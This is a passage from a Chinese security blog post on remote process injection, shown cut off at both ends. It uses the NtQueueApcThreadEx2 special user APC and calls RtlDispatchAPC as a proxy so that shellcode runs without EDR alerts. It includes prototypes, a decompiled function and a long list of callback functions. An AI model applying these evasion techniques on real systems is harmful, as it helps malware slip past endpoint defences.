USER_APC_OPTION, *PUSER_APC_OPTION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考链接：</span><br><span class="line">https://ntdoc.m417z.com/ntqueueapcthreadex</span><br></pre></td></tr></table></figure><p>看完函数原型，可以很清晰的知道是将第2个参数ReserveHandle替换为结构体UserApcOption，然后在UserApcOption中的Flags传入QUEUE_USER_APC_SPECIAL_USER_APC后，允许我们注入到一个不需要alertable状态的线程</p><p>这种新的APC类型也因引入稳定性问题的风险而受到批评，并使线程同步变得更加困难。但在我们的情况下这不是一个问题，因为我们正在使用它来运行一个与运行应用程序完全独立且不存在并发的场景。最新的APC类型被正式添加到了Windows 11 Build 22000中，对应的用户层API是QueueUserAPC2，底层对应的内核层API是NtQueueApcThreadEx2，函数原型是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NtQueueApcThreadEx2(</span><br><span class="line">    _In_ HANDLE ThreadHandle,</span><br><span class="line">    _In_opt_ HANDLE ReserveHandle, // NtAllocateReserveObject</span><br><span class="line">    _In_ ULONG ApcFlags, // QUEUE_USER_APC_FLAGS</span><br><span class="line">    _In_ PPS_APC_ROUTINE ApcRoutine, // RtlDispatchAPC</span><br><span class="line">    _In_opt_ PVOID ApcArgument1,</span><br><span class="line">    _In_opt_ PVOID ApcArgument2,</span><br><span class="line">    _In_opt_ PVOID ApcArgument3</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>实际上，这个API在Windows 10 19045中就已经存在了，这是一个相对新的API，也就有相对新的Syscall，使用它可以增大我们绕过AV/EDR的机会。在我们的注入器中，我们将使用这个API在远程线程执行代码</p><h3 id="RtlDispatchAPC"><a href="#RtlDispatchAPC" class="headerlink" title="RtlDispatchAPC"></a>RtlDispatchAPC</h3><p>这个函数不是我们这项技术中的必须项，但可以帮助我们的shellcode执行更隐蔽，shellcode拷贝到目标进程后，下一步是添加shellcode的起始地址到远程线程的APC队列中。但是我们的shellcode是私有内存，并不是映射内存，直接执行私有内存可能会触发一些告警，想要躲避这类告警我们需要一些合法函数作为代理，有很多函数允许我们通过回调函数执行，多数被总结如下</p><p>函数RtlDispatchAPC看起来像是一个完美的候选，它有3个参数，因此它是兼容APC的，实现如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall RtlDispatchAPC(void (__fastcall *callback)(__int64), __int64 callback_arg, void *a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v6 = 72LL;</span><br><span class="line">  int v7 = 1;</span><br><span class="line">  __int128 v8 = 0LL;</span><br><span class="line">  __int128 v9 = 0LL;</span><br><span class="line">  __int128 v10 = 0LL;</span><br><span class="line">  __int64 v11 = 0LL;</span><br><span class="line"></span><br><span class="line">  if ( a3 == (void *)-1LL )</span><br><span class="line">  &#123;</span><br><span class="line">    callback(callback_arg);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    RtlActivateActivationContextUnsafeFast(&amp;v6, a3);</span><br><span class="line">    callback(callback_arg);</span><br><span class="line">    RtlDeactivateActivationContextUnsafeFast(&amp;v6);</span><br><span class="line">    RtlReleaseActivationContext(a3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要使上面的函数执行我们的shellcode，我们需要给他传递下列的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlDispatchAPC(shellcodePtr, 0, (void *)(-1))</span><br></pre></td></tr></table></figure><p>需要注意，RtlDispatchAPC没有导出函数名，我们需要通过序号调用它<br><img src="/2025/10/10/%E9%AB%98%E7%BA%A7%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A9%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%90%8D%E5%92%8CAPC/01.png" alt="image"></p><p>允许我们通过回调执行的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br></pre></td><td class="code"><pre><span class="line">acmDriverEnumCallback</span><br><span class="line">acmDriverProc</span><br><span class="line">acmFilterChooseHookProc</span><br><span class="line">acmFilterEnumCallback</span><br><span class="line">acmFilterTagEnumCallback</span><br><span class="line">acmFormatChooseHookProc</span><br><span class="line">acmFormatEnumCallback</span><br><span class="line">acmFormatTagEnumCallback</span><br><span class="line">acmStreamConvertCallback</span><br><span class="line">AddInterface</span><br><span class="line">AddPropSheetPageProc</span><br><span class="line">AddSecureMemoryCacheCallback</span><br><span class="line">agePaintHook</span><br><span class="line">ageSetupHook</span><br><span class="line">AllocateMemory</span><br><span class="line">APCProc</span><br><span class="line">ApplicationRecoveryCallback</span><br><span class="line">ApplyCallbackFunction</span><br><span class="line">asswordChangeNotify</span><br><span class="line">asswordFilter</span><br><span class="line">AuthzAccessCheckCallback</span><br><span class="line">AuthzComputeGroupsCallback</span><br><span class="line">AuthzFreeGroupsCallback</span><br><span class="line">BindIoCompletionCallback</span><br><span class="line">BlockConvertServicesToStatic</span><br><span class="line">BlockDeleteStaticServices</span><br><span class="line">BrowseCallbackProc</span><br><span class="line">BufferCallback</span><br><span class="line">CallWndProc</span><br><span class="line">CallWndRetProc</span><br><span class="line">capControlCallback</span><br><span class="line">capErrorCallback</span><br><span class="line">capStatusCallback</span><br><span class="line">capVideoStreamCallback</span><br><span class="line">capWaveStreamCallback</span><br><span class="line">capYieldCallback</span><br><span class="line">CBTProc</span><br><span class="line">CCHookProc</span><br><span class="line">CertChainFindByIssuerCallback</span><br><span class="line">CertDllOpenStoreProv</span><br><span class="line">CertEnumPhysicalStoreCallback</span><br><span class="line">CertEnumSystemStoreCallback</span><br><span class="line">CertEnumSystemStoreLocationCallback</span><br><span class="line">CertStoreProvCloseCallback</span><br><span class="line">CertStoreProvDeleteCertCallback</span><br><span class="line">CertStoreProvDeleteCRLCallback</span><br><span class="line">CertStoreProvDeleteCTL</span><br><span class="line">CertStoreProvFindCert</span><br><span class="line">CertStoreProvFindCRL</span><br><span class="line">CertStoreProvFindCTL</span><br><span class="line">CertStoreProvFreeFindCert</span><br><span class="line">CertStoreProvFreeFindCRL</span><br><span class="line">CertStoreProvFreeFindCTL</span><br><span class="line">CertStoreProvGetCertProperty</span><br><span class="line">CertStoreProvGetCRLProperty</span><br><span class="line">CertStoreProvGetCTLProperty</span><br><span class="line">CertStoreProvReadCertCallback</span><br><span class="line">CertStoreProvReadCRLCallback</span><br><span class="line">CertStoreProvReadCTL</span><br><span class="line">CertStoreProvSetCertPropertyCallback</span><br><span class="line">CertStoreProvSetCRLPropertyCallback</span><br><span class="line">CertStoreProvSetCTLProperty</span><br><span class="line">CertStoreProvWriteCertCallback</span><br><span class="line">CertStoreProvWriteCRLCallback</span><br><span class="line">CertStoreProvWriteCTL</span><br><span class="line">CFHookProc</span><br><span class="line">ClaimMediaLabel</span><br><span class="line">CleanupGroupCancelCallback</span><br><span class="line">ClientCallback</span><br><span class="line">ClientCallback_Function</span><br><span class="line">CloseServiceEnumerationHandle</span><br><span class="line">CollectPerformanceData</span><br><span class="line">CompletionProc</span><br><span class="line">ConnectClient</span><br><span class="line">ControlCallback</span><br><span class="line">CopyProgressRoutine</span><br><span class="line">CounterPathCallBack</span><br><span class="line">CQPageProc</span><br><span class="line">CreateServiceEnumerationHandle</span><br><span class="line">CreateStaticService</span><br><span class="line">CryptGetSignerCertificateCallback</span><br><span class="line">CRYPT_ENUM_KEYID_PROP</span><br><span class="line">CRYPT_ENUM_OID_FUNCTION</span><br><span class="line">CRYPT_ENUM_OID_INFO</span><br><span class="line">CRYPT_RETURN_HWND</span><br><span class="line">CRYPT_VERIFY_IMAGE</span><br><span class="line">CspGetDHAgreement</span><br><span class="line">DavAuthCallback</span><br><span class="line">DavFreeCredCallback</span><br><span class="line">DavRegisterAuthCallback</span><br><span class="line">DavUnregisterAuthCallback</span><br><span class="line">DdeCallback</span><br><span class="line">DdeEnableCallback</span><br><span class="line">DeleteInterface</span><br><span class="line">DeleteStaticService</span><br><span class="line">DemandDialRequest</span><br><span class="line">DhcpAddressDelHook</span><br><span class="line">DhcpAddressOfferHook</span><br><span class="line">DhcpControlHook</span><br><span class="line">DhcpDeleteClientHook</span><br><span class="line">DhcpHandleOptionsHook</span><br><span class="line">DhcpNewPktHook</span><br><span class="line">DhcpPktDropHook</span><br><span class="line">DhcpPktSendHook</span><br><span class="line">DhcpServerCalloutEntry</span><br><span class="line">DialogProc</span><br><span class="line">DigestFunction</span><br><span class="line">DisassociateCurrentThreadFromCallback</span><br><span class="line">DisconnectClient</span><br><span class="line">DllCallbackProc</span><br><span class="line">DllGetClassObject</span><br><span class="line">DoUpdateRoutes</span><br><span class="line">DoUpdateServices</span><br><span class="line">DPA_DestroyCallback</span><br><span class="line">DPA_EnumCallback</span><br><span class="line">DrawStateProc</span><br><span class="line">DriverCallback</span><br><span class="line">DSA_DestroyCallback</span><br><span class="line">DSA_EnumCallback</span><br><span class="line">DSEnumAttributesCallback</span><br><span class="line">EditStreamCallback</span><br><span class="line">EditWordBreakProc</span><br><span class="line">EditWordBreakProcEx</span><br><span class="line">EmbeddedUIHandler</span><br><span class="line">EnableCallback</span><br><span class="line">EnhMetaFileProc</span><br><span class="line">EnumCalendarInfoProc</span><br><span class="line">EnumCalendarInfoProcEx</span><br><span class="line">EnumCalendarInfoProcExEx</span><br><span class="line">EnumChildProc</span><br><span class="line">EnumCodePagesProc</span><br><span class="line">EnumDateFormatsProc</span><br><span class="line">EnumDateFormatsProcEx</span><br><span class="line">EnumDateFormatsProcExEx</span><br><span class="line">EnumDesktopProc</span><br><span class="line">EnumDirTreeProc</span><br><span class="line">EnumerateGetNextService</span><br><span class="line">EnumerateLoadedModulesProc64</span><br><span class="line">EnumFontFamExProc</span><br><span class="line">EnumFontFamProc</span><br><span class="line">EnumFontsProc</span><br><span class="line">EnumGeoInfoProc</span><br><span class="line">EnumICMProfilesProcCallback</span><br><span class="line">EnumInputContext</span><br><span class="line">EnumLanguageGroupLocalesProc</span><br><span class="line">EnumLanguageGroupsProc</span><br><span class="line">EnumLocalesProc</span><br><span class="line">EnumLocalesProcEx</span><br><span class="line">EnumMetaFileProc</span><br><span class="line">EnumObjectsProc</span><br><span class="line">EnumPageFilesProc</span><br><span class="line">EnumRegisterWordProc</span><br><span class="line">EnumResLangProc</span><br><span class="line">EnumResNameProc</span><br><span class="line">EnumResTypeProc</span><br><span class="line">EnumThreadWndProc</span><br><span class="line">EnumTimeFormatsProc</span><br><span class="line">EnumTimeFormatsProcEx</span><br><span class="line">EnumUILanguagesProc</span><br><span class="line">EnumWindowsProc</span><br><span class="line">EnumWindowStationProc</span><br><span class="line">EventCallback</span><br><span class="line">EventClassCallback</span><br><span class="line">EventRecordCallback</span><br><span class="line">Event_Handler_Function_Name</span><br><span class="line">EVT_SUBSCRIBE_CALLBACK</span><br><span class="line">ExportCallback</span><br><span class="line">FaxLineCallback</span><br><span class="line">FaxRouteAddFile</span><br><span class="line">FaxRouteDeleteFile</span><br><span class="line">FaxRouteEnumFile</span><br><span class="line">FaxRouteEnumFiles</span><br><span class="line">FaxRouteGetFile</span><br><span class="line">FaxRouteModifyRoutingData</span><br><span class="line">FaxRoutingInstallationCallback</span><br><span class="line">FaxSendCallback</span><br><span class="line">FAX_RECIPIENT_CALLBACK</span><br><span class="line">FExecuteInAppDomainCallback</span><br><span class="line">FiberProc</span><br><span class="line">FileIOCompletionRoutine</span><br><span class="line">FILE_RESTORE_CALLBACK</span><br><span class="line">FindDebugInfoFileProc</span><br><span class="line">FindExecutableImageProc</span><br><span class="line">FLockClrVersionCallback</span><br><span class="line">FlsCallback</span><br><span class="line">FNCCERTDISPLAYPROC</span><br><span class="line">FNCFILTERPROC</span><br><span class="line">FNCMFILTERPROC</span><br><span class="line">FNCMHOOKPROC</span><br><span class="line">FNDAENUMCALLBACK</span><br><span class="line">FNDPAENUMCALLBACK</span><br><span class="line">FNDSAENUMCALLBACK</span><br><span class="line">FNPEER_FREE_SECURITY_DATA</span><br><span class="line">FNPEER_SECURE_RECORD</span><br><span class="line">FNPEER_VALIDATE_RECORD</span><br><span class="line">FN_AUTHENTICATION_CALLBACK</span><br><span class="line">FN_AUTHENTICATION_CALLBACK_EX</span><br><span class="line">FN_BLUETOOTH_ENUM_ATTRIBUTES_CALLBACK</span><br><span class="line">FN_CDF_PARSE_ERROR_CALLBACK</span><br><span class="line">FN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK</span><br><span class="line">FN_CERT_DLL_OPEN_STORE_PROV_FUNC</span><br><span class="line">FN_CERT_ENUM_PHYSICAL_STORE</span><br><span class="line">FN_CERT_ENUM_SYSTEM_STORE</span><br><span class="line">FN_CERT_STORE_PROV_CLOSE</span><br><span class="line">FN_CERT_STORE_PROV_DELETE_CERT</span><br><span class="line">FN_CERT_STORE_PROV_DELETE_CRL</span><br><span class="line">FN_CERT_STORE_PROV_READ_CERT</span><br><span class="line">FN_CERT_STORE_PROV_READ_CRL</span><br><span class="line">FN_CERT_STORE_PROV_SET_CERT_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_SET_CRL_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_SET_CTL_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CERT</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CRL</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CTL</span><br><span class="line">FN_CRYPT_XML_CREATE_TRANSFORM</span><br><span class="line">FN_CRYPT_XML_DATA_PROVIDER_CLOSE</span><br><span class="line">FN_CRYPT_XML_DATA_PROVIDER_READ</span><br><span class="line">FN_CRYPT_XML_ENUM_ALG_INFO</span><br><span class="line">FN_CRYPT_XML_WRITE_CALLBACK</span><br><span class="line">FN_DEVICE_CALLBACK</span><br><span class="line">FN_WdsCliCallback</span><br><span class="line">FN_WdsCliTraceFunction</span><br><span class="line">FN_WdsTransportClientReceiveContents</span><br><span class="line">FN_WdsTransportClientReceiveMetadata</span><br><span class="line">FN_WdsTransportClientSessionComplete</span><br><span class="line">FN_WdsTransportClientSessionStart</span><br><span class="line">FN_WdsTransportClientSessionStartEx</span><br><span class="line">ForegroundIdleProc</span><br><span class="line">FreeMemory</span><br><span class="line">FRHookProc</span><br><span class="line">FuncReturnhWnd</span><br><span class="line">FunctionTableAccessProc64</span><br><span class="line">FuncVerifyImage</span><br><span class="line">GenerateGroupPolicy</span><br><span class="line">GetApplicationRecoveryCallback</span><br><span class="line">GetEventMessage</span><br><span class="line">GetFirstOrderedService</span><br><span class="line">GetGlobalInfo</span><br><span class="line">GetInterfaceInfo</span><br><span class="line">GetMfeStatus</span><br><span class="line">GetModuleBaseProc64</span><br><span class="line">GetMsgProc</span><br><span class="line">GetNeighbors</span><br><span class="line">GetNextOrderedService</span><br><span class="line">GetRequest</span><br><span class="line">GetResponse</span><br><span class="line">GetServiceCount</span><br><span class="line">GetSize</span><br><span class="line">GetTSAudioEndpointEnumeratorForSession</span><br><span class="line">gluNurbsCallback</span><br><span class="line">gluQuadricCallback</span><br><span class="line">gluTessCallback</span><br><span class="line">GopherAttributeEnumerator</span><br><span class="line">HandlerEx</span><br><span class="line">HandlerRoutine</span><br><span class="line">honeCallbackFunc</span><br><span class="line">hone_Event</span><br><span class="line">HyphenateProc</span><br><span class="line">ICMProgressProcCallback</span><br><span class="line">ImportCallback</span><br><span class="line">InitHelperDll</span><br><span class="line">InitializeChangeNotify</span><br><span class="line">InitializeEmbeddedUI</span><br><span class="line">InitOnceCallback</span><br><span class="line">InsertAt</span><br><span class="line">InstalluiHandler</span><br><span class="line">InstalluiHandlerRecord</span><br><span class="line">INSTALLUI_HANDLER</span><br><span class="line">InterfaceStatus</span><br><span class="line">InternetSetStatusCallback</span><br><span class="line">InternetStatusCallback</span><br><span class="line">INTERNET_STATUS_CALLBACK</span><br><span class="line">IoCompletionCallback</span><br><span class="line">IOProc</span><br><span class="line">IsService</span><br><span class="line">JournalPlaybackProc</span><br><span class="line">JournalRecordProc</span><br><span class="line">KeyboardProc</span><br><span class="line">lineCallbackFunc</span><br><span class="line">LineDDAProc</span><br><span class="line">Line_Event</span><br><span class="line">LOG_FULL_HANDLER_CALLBACK</span><br><span class="line">LOG_TAIL_ADVANCE_CALLBACK</span><br><span class="line">LOG_UNPINNED_CALLBACK</span><br><span class="line">LowLevelKeyboardProc</span><br><span class="line">LowLevelMouseProc</span><br><span class="line">LPCQADDFORMSPROC</span><br><span class="line">LPCQADDPAGESPROC</span><br><span class="line">LPCQPAGEPROC</span><br><span class="line">LPDISPLAYVAL</span><br><span class="line">LPDSENUMATTRIBUTES</span><br><span class="line">LPEVALCOMCALLBACK</span><br><span class="line">LPFNDFMCALLBACK</span><br><span class="line">LPFNVIEWCALLBACK</span><br><span class="line">MagGetImageScalingCallback</span><br><span class="line">MagImageScalingCallback</span><br><span class="line">MagSetImageScalingCallback</span><br><span class="line">MappingCallbackProc</span><br><span class="line">MaxMediaLabel</span><br><span class="line">MessageProc</span><br><span class="line">MFAddPeriodicCallback</span><br><span class="line">MFInvokeCallback</span><br><span class="line">MFPERIODICCALLBACK</span><br><span class="line">MFRemovePeriodicCallback</span><br><span class="line">MgmCreationAlertCallback</span><br><span class="line">MgmDisableIgmpCallback</span><br><span class="line">MgmJoinAlertCallback</span><br><span 